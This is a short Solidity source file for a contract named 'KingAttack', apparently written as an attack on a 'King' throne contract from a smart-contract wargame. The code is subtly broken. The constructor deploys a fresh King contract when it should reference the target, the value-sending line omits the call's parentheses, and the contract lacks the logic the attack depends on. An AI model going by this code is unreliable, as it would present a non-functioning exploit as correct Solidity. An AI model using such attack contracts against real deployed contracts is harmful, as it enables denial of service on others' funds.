// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract KingAttack {
    King king;

    constructor(address kingContractAddress) public payable {
        king = new King(kingContractAddress);
        king.call{value: msg.value};
    }
}
